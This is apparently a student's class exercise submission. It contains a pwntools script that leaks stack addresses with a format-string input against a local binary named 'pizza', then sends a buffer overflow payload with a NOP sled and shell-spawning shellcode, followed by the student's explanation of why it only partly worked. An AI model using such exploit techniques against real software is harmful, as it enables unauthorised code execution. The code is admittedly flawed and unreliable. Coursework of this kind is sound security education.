# Code
```
  from pwn import *

  elf = ELF("./pizza")

  context(arch='amd64', os='linux', endian='little', word_size=64)
  getname_address = elf.symbols["getname"]
  input1 = b"%p " * 20

  victim = process("./pizza")
  victim.sendline(input1)
  victim.recvline()

  stack_addresses = victim.recvline().strip().split()
  stack_addresses = stack_addresses[7:]
  stack_offset = int(stack_addresses[3], 16)

  return_address = p64(stack_offset)
  exploit_payload = b"A" * 2000 + return_address + b"\x90" * 100 + asm(shellcraft.amd64.linux.sh())

  victim.sendline(exploit_payload)
  victim.interactive()
```

# Explanation
For this code, I set it up to be similar to what we had done in class, with the code to use pwntools and get formatting of everything right. Then I had it inject the %p 20 times into the code so that way I could the stack addresses starting at index 7 and going to the end since that was where my stack addressed would actually begin. Then I tried to calculate the stack offset to see where the return address would be so that I could inject shellcode into it as well as enough 'A's to ensure the program would crash so that my shellcode could take over. Then it would keep going with the shellcode as the new interactive process.

For some reason when I did all this, I got it to do the shell thing with the $ but when I put anything in it, the pizza code took it as input and would keep doing it's thing but using whatever shell commands I wrote were just used as the input it wanted for the program until it got to the end of it, so I think I have an issue with finding the right part of the stack to put my shellcode into but I'm not 100% about that. It's what ChatGPT said was most likely the issue but I couldn't figure out how to fix it.
